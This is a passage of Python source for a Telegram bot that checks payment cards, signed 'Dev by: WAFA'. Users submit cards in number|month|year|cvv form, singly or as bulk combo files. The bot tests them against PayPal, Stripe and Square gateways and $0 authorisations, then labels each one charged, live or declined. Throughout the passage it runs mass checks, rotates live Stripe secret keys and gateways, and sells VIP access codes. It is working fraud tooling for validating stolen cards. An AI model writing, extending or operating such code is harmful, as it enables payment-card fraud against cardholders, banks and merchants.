            return {'status': 'error', 'message': 'Error parsing response', 'taken': taken}
    except Exception as e:
        return {'status': 'error', 'message': str(e)[:50], 'taken': 0}
    finally:
        try:
            session.close()
        except:
            pass

# ============ لوحة الأزرار ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    username = update.effective_user.username or "No Username"
    keyboard = [
        [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
        [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
        [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
        [
            InlineKeyboardButton("💳 Check", callback_data="check_panel"),
            InlineKeyboardButton("📊 Stats", callback_data="stats_panel"),
        ],
    ]
    await update.message.reply_text(
        premium_emoji(f"""🔥 Welcome! @{username} 🔥
- - - - - - - - - - - - - - - - - - - - - -
🔥 Bot Status: Online 🚀"""),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    await query.edit_message_text(
        premium_emoji("""🤖 FREE COMMANDS:
• /start - Start
• /cmds - Commands
• /pp [card] - PayPal single
• /st [card] - Stripe single
• /sq [card] - Square single
• /auth [card] - Auth $0 check
• /stop - Stop mass
• /code [key] - Activate VIP"""),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    await query.edit_message_text(
        premium_emoji("""💎 VIP COMMANDS:
• Upload combo file - Mass checking
• /st [card] - Stripe single
• /sq [card] - Square single
• /auth [card] - Auth $0 check"""),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ADMINS:
        await query.answer("Admin only!", show_alert=True)
        return
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    await query.edit_message_text(
        premium_emoji("""👑 ADMIN COMMANDS:
• /add [url] - Add gateway
• /rmadd [num] - Remove gateway
• /show_gateways - Show gateways
• /ban_user [id] - Ban user
• /unban_user [id] - Unban user
• /prm [id] [days] - Add VIP
• /rmprm [id] - Remove VIP
• /addkey [pk] [sk] - Add Stripe key
• /rmkey [id] - Remove Stripe key
• /wafa [days] [max] - Generate codes
• /SENT [msg] - Broadcast"""),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("💳 PayPal", callback_data="check_paypal")],
        [InlineKeyboardButton("💳 Stripe", callback_data="check_stripe")],
        [InlineKeyboardButton("💳 Square", callback_data="check_square")],
        [InlineKeyboardButton("🛡 Auth $0", callback_data="check_auth")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")],
    ]
    await query.edit_message_text(
        premium_emoji("💳 Choose check type:"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def check_paypal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/pp [card]</code>"), parse_mode="HTML")

async def check_stripe_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/st [card]</code>"), parse_mode="HTML")

async def check_square_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/sq [card]</code>"), parse_mode="HTML")

async def check_auth_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("🛡 Send card:\n<code>/auth [card]</code>"), parse_mode="HTML")

async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    await query.edit_message_text(
        premium_emoji(f"""📊 STATS:
👥 Users: {len(ALL_USERS)}
🌐 Gateways: {len(GATEWAYS)}
🔑 Stripe Keys: {len(STRIPE_KEYS)}"""),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username or "No Username"
    keyboard = [
        [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
        [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
        [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
        [
            InlineKeyboardButton("💳 Check", callback_data="check_panel"),
            InlineKeyboardButton("📊 Stats", callback_data="stats_panel"),
        ],
    ]
    await query.edit_message_text(
        premium_emoji(f"""🔥 Welcome! @{username} 🔥
- - - - - - - - - - - - - - - - - - - - - -
🔥 Bot Status: Online 🚀"""),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ============ لوحة البوابات ============

async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    if not GATEWAYS:
        await update.message.reply_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
        return
    keyboard = []
    for i, gateway in enumerate(GATEWAYS, 1):
        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
    await update.message.reply_text(
        premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def gate_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ADMINS:
        return
    gate_num = int(query.data.split("_")[2])
    if 1 <= gate_num <= len(GATEWAYS):
        gateway_url = GATEWAYS[gate_num - 1]
        keyboard = [
            [InlineKeyboardButton("🗑 Remove", callback_data=f"gate_remove_{gate_num}")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_gateways")],
        ]
        await query.edit_message_text(
            premium_emoji(f"🌐 <b>Gateway #{gate_num}:</b>\n<code>{gateway_url}</code>\n\nChoose action:"),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def gate_remove_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ADMINS:
        return
    gate_num = int(query.data.split("_")[2])
    if 1 <= gate_num <= len(GATEWAYS):
        GATEWAYS.pop(gate_num - 1)
        keyboard = []
        for i, gateway in enumerate(GATEWAYS, 1):
            keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
        keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
        await query.edit_message_text(
            premium_emoji(f"🗑 <b>Gateway #{gate_num} removed!</b>\n\n🌐 <b>Remaining ({len(GATEWAYS)}):</b>"),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def back_to_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not GATEWAYS:
        await query.edit_message_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
        return
    keyboard = []
    for i, gateway in enumerate(GATEWAYS, 1):
        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
    await query.edit_message_text(
        premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def close_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.delete_message()

# ============ أوامر ============

async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands_text = """🤵 ADMIN:
• /add [url] - Add PayPal gateway
• /rmadd [num] - Remove gateway
• /show_gateways - Show gateways
• /ban_user [id] - Ban user
• /unban_user [id] - Unban user
• /prm [id] [days] - Add VIP
• /rmprm [id] - Remove VIP
• /wafa [days] [max] - Generate keys
• /show_users - Show users
• /try [id] [msg] - DM user
• /SENT [msg] - Broadcast
• /addkey [pk] [sk] - Add Stripe key
• /rmkey [id] - Remove Stripe key

💎 VIP:
• Upload combo file - Mass checking
• /st [card] - Stripe single
• /sq [card] - Square single
• /auth [card] - Auth $0 check

🤖 FREE:
• /start - Start
• /cmds - Commands
• /pp [card] - PayPal single
• /st [card] - Stripe single
• /sq [card] - Square single
• /auth [card] - Auth $0 check
• /stop - Stop mass
• /code [key] - Activate VIP"""
    await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/pp [card]</code>"), parse_mode="HTML")
        return
    card_full = " ".join(context.args)
    gateway_num = 0
    gateway_url = None
    if GATEWAYS:
        gateway_num = (gateway_index % len(GATEWAYS)) + 1
        gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
    status, response = await check_card_api(card_full, gateway_url)
    text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Single")
    await update.message.reply_text(text, parse_mode="HTML")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")

async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=premium_emoji(reply_text), parse_mode="HTML")
    except: pass

async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    broadcast_msg = " ".join(context.args)
    for user_id in list(ALL_USERS):
        try:
            await context.bot.send_message(chat_id=user_id, text=premium_emoji(f"📢 {broadcast_msg}"), parse_mode="HTML")
            await asyncio.sleep(0.05)
        except: continue

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not context.args: return
    code = context.args[0].upper()
    if code not in CODES: return
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]: return
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(premium_emoji(f"🚀 VIP activated for {code_data['duration']} days."), parse_mode="HTML")

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        duration, max_users = int(context.args[0]), int(context.args[1])
        code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
        CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
        await update.message.reply_text(premium_emoji(f"💰 Code: <code>{code}</code>"), parse_mode="HTML")
    except: pass

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    msg = "📊 Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
        msg += f"• <code>{uid}</code> - <b>{status}</b>\n"
    await update.message.reply_text(premium_emoji(msg), parse_mode="HTML")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    BANNED_USERS[int(context.args[0])] = True
    await update.message.reply_text(premium_emoji("✅ Banned."), parse_mode="HTML")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    BANNED_USERS.pop(int(context.args[0]), None)
    await update.message.reply_text(premium_emoji("✅ Unbanned."), parse_mode="HTML")

async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    url = context.args[0]
    if url not in GATEWAYS:
        GATEWAYS.append(url)
        await update.message.reply_text(premium_emoji(f"✅ Gateway #{len(GATEWAYS)} added."), parse_mode="HTML")

async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        if context.args:
            idx = int(context.args[0])
            if 1 <= idx <= len(GATEWAYS):
                GATEWAYS.pop(idx - 1)
                await update.message.reply_text(premium_emoji(f"🗑 Gateway #{idx} removed!"), parse_mode="HTML")
            else:
                await update.message.reply_text(premium_emoji(f"❌ Gateway #{idx} not found!"), parse_mode="HTML")
        else:
            if GATEWAYS:
                GATEWAYS.pop()
                await update.message.reply_text(premium_emoji("🗑 Last gateway removed."), parse_mode="HTML")
    except:
        await update.message.reply_text(premium_emoji("💡 Usage: /rmadd [number]"), parse_mode="HTML")

async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    VIP_USERS[int(context.args[0])] = int(time.time()) + (int(context.args[1]) * 86400)
    await update.message.reply_text(premium_emoji("✅ VIP added."), parse_mode="HTML")

async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    VIP_USERS.pop(int(context.args[0]), None)
    await update.message.reply_text(premium_emoji("✅ VIP removed."), parse_mode="HTML")

async def add_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    args_text = " ".join(context.args)
    pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', args_text)
    sk_match = re.search(r'sk_live_[a-zA-Z0-9]+', args_text)
    if not pk_match or not sk_match:
        await update.message.reply_text(premium_emoji("💡 Usage:\n<code>/addkey pk_live_xxx sk_live_xxx</code>"), parse_mode="HTML")
        return
    pk, sk = pk_match.group(0), sk_match.group(0)
    key_id = str(len(STRIPE_KEYS) + 1)
    STRIPE_KEYS[key_id] = {"pk": pk, "sk": sk}
    with open('stripe_keys.json', 'w') as f:
        json.dump(STRIPE_KEYS, f)
    await update.message.reply_text(premium_emoji(f"✅ Stripe Key Saved!\n🆔 Key ID: <code>{key_id}</code>"), parse_mode="HTML")

async def remove_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    if not context.args:
        return
    key_id = context.args[0]
    if key_id in STRIPE_KEYS:
        del STRIPE_KEYS[key_id]
        with open('stripe_keys.json', 'w') as f:
            json.dump(STRIPE_KEYS, f)
        await update.message.reply_text(premium_emoji(f"✅ Key {key_id} removed!"), parse_mode="HTML")

# ============ دوال التنسيق والفحص ============

async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    if status == "approved":
        status_text = "Approved / Charge 🔥💎"
    elif status == "live":
        status_text = "Live / Insufficient Funds ✅✨"
    else:
        status_text = "Declined / Error ❌"
    if user_id in ADMINS:
        user_status = "Admin 👑"
        gateway_info = f"\n[🔗] Gate #{gateway_num}: <code>{gateway_url}</code>" if gateway_url else ""
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
        gateway_info = f"\n[🔗] Gate #{gateway_num}" if gateway_num else ""
    else:
        user_status = "Free User 🤖"
        gateway_info = ""
    return premium_emoji(f"""#PayPal [{mode}] 🌟
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Card: <code>{card_full}</code>
[ϟ] Response: <code>{response}</code>
[ϟ] Status: {status_text}
[ϟ] Taken: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Info: <code>{info}</code>
[ϟ] Bank: <code>{bank}</code>
[ϟ] Country: <code>{country}</code>
[⎇] Req By: <code>{user_id}</code> ({user_status}){gateway_info}
- - - - - - - - - - - - - - - - - - - - - -
[⌤] Dev by: WAFA 🍀""")

async def format_stripe_response(card_full, result, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "SUCCEEDED" in result_upper:
        status_text = "Approved / Charge $1 🔥💎"
    elif "INSUFFICIENT" in result_upper:
        status_text = "Live / Insufficient Funds ✅✨"
    elif "LIVE" in result_upper:
        status_text = "Live ✅✨"
    else:
        status_text = "Declined ❌"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    return premium_emoji(f"""#Stripe [{mode}] 🌟
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Card: <code>{card_full}</code>
[ϟ] Response: <code>{result}</code>
[ϟ] Status: {status_text}
[ϟ] Taken: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Info: <code>{info}</code>
[ϟ] Bank: <code>{bank}</code>
[ϟ] Country: <code>{country}</code>
[⎇] Req By: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
[⌤] Dev by: WAFA 🍀""")

async def format_square_response(card_full, result, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    if "CHARGE" in result:
        status_text = "Approved / Charge 🔥💎"
    elif "LIVE" in result:
        status_text = "Live / Insufficient Funds ✅✨"
    else:
        status_text = "Declined / Error ❌"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    return premium_emoji(f"""#Square [{mode}] 🌟
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Card: <code>{card_full}</code>
[ϟ] Response: <code>{result}</code>
[ϟ] Status: {status_text}
[ϟ] Taken: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Info: <code>{info}</code>
[ϟ] Bank: <code>{bank}</code>
[ϟ] Country: <code>{country}</code>
[⎇] Req By: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
[⌤] Dev by: WAFA 🍀""")

async def format_auth_response(card_full, result_dict, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    status = result_dict.get('status', 'declined')
    message = result_dict.get('message', '')
    if status == "approved":
        status_text = "Approved 🔥💎"
    elif status == "live":
        status_text = "Live ✅✨"
    else:
        status_text = "Declined ❌"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    return premium_emoji(f"""#Auth $0 [{mode}] 🌟
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Card: <code>{card_full}</code>
[ϟ] Response: <code>{message}</code>
[ϟ] Status: {status_text}
[ϟ] Taken: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Info: <code>{info}</code>
[ϟ] Bank: <code>{bank}</code>
[ϟ] Country: <code>{country}</code>
[⎇] Req By: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
[⌤] Dev by: WAFA 🍀""")

async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/auth [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result_dict = await loop.run_in_executor(None, check_auth_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_auth_response(card, result_dict, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")

async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not STRIPE_KEYS:
        await update.message.reply_text(premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/st [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("🔄 Checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, check_stripe_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_stripe_response(card, result, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")

async def sq_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/sq [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("🔄 Checking Square..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, check_square_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_square_response(card, result, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")

def can_user_check(user_id, mode="file"):
    if user_id in ADMINS: return True
    if BANNED_USERS.get(user_id): return False
    if user_id in VIP_USERS and VIP_USERS[user_id] > time.time(): return True
    return mode == "single"

async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "file"):
        await update.message.reply_text(premium_emoji("❌ File arrays require Premium."), parse_mode="HTML")
        return
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)
        pending_files[user_id] = {"file_path": file_path, "chat_id": update.effective_chat.id}
        keyboard = [
            [InlineKeyboardButton("💳 PayPal Check", callback_data="gateway_paypal")],
            [InlineKeyboardButton("💳 Stripe Check", callback_data="gateway_stripe")],
            [InlineKeyboardButton("💳 Square Check", callback_data="gateway_square")],
            [InlineKeyboardButton("🛡 Auth $0 Check", callback_data="gateway_auth")],
        ]
        await update.message.reply_text(premium_emoji("📁 File Received!\nChoose gateway:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    gateway_type = query.data.split("_")[1]
    if user_id not in pending_files:
        await query.edit_message_text(premium_emoji("❌ File expired."), parse_mode="HTML")
        return
    file_path = pending_files[user_id]["file_path"]
    chat_id = pending_files[user_id]["chat_id"]
    await query.edit_message_text(premium_emoji(f"✅ {gateway_type.upper()} selected! Processing..."), parse_mode="HTML")
    if gateway_type == "paypal":
        task = asyncio.create_task(process_paypal_file(file_path, chat_id, context))
    elif gateway_type == "stripe":
        task = asyncio.create_task(process_stripe_file(file_path, chat_id, context))
    elif gateway_type == "square":
        task = asyncio.create_task(process_square_file(file_path, chat_id, context))
    elif gateway_type == "auth":
        task = asyncio.create_task(process_auth_file(file_path, chat_id, context))
    user_tasks[user_id] = task
    del pending_files[user_id]

async def process_paypal_file(file_path, chat_id, context):
    global gateway_index
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🎯 Start Checking..."), parse_mode="HTML")
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        for line in lines:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match: continue
            card_full = match[0]
            card_counter += 1
            gateway_num = 0
            gateway_url = None
            if GATEWAYS:
                gateway_num = ((card_counter - 1) % len(GATEWAYS)) + 1
                gateway_url = GATEWAYS[(card_counter - 1) % len(GATEWAYS)]
            status, response = await check_card_api(card_full, gateway_url)
            if status == "approved":
                approved += 1
                text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
            elif status == "live":
                live += 1
                text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
            else:
                declined += 1
            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ▬▬ [ MASS PAYPAL ] ▬▬
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
✅ Charge: <code>{approved}</code>
✅ Live: <code>{live}</code>
❌ Declined: <code>{declined}</code>
📊 Total: <code>{approved + live + declined}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Card #{card_counter}: <code>{card_full}</code>
🌐 Gate: <code>{gateway_num}</code>
📝 Response: <code>{response}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
            except: pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji("🚀 PayPal complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def process_stripe_file(file_path, chat_id, context):
    if not STRIPE_KEYS:
        await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
        return
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🔄 Stripe Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        keys_list = list(STRIPE_KEYS.keys())
        total_keys = len(keys_list)
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        for line in lines:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match: continue
            card_full = match[0]
            card_counter += 1
            key_id = keys_list[(card_counter - 1) % total_keys]
            result = await loop.run_in_executor(None, check_stripe_sync, card_full, key_id)
            result_upper = str(result).upper()
            if "CHARGE" in result_upper:
                approved += 1
                text = await format_stripe_response(card_full, result, 0, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
            elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
                live += 1
                text = await format_stripe_response(card_full, result, 0, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
            else:
                declined += 1
            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ▬▬ [ MASS STRIPE ] ▬▬
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
✅ Charge: <code>{approved}</code>
✅ Live: <code>{live}</code>
❌ Declined: <code>{declined}</code>
📊 Total: <code>{approved + live + declined}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Card #{card_counter}: <code>{card_full}</code>
🔑 Key: <code>{key_id}</code>
📝 Result: <code>{result[:80]}</code>"""
            try:
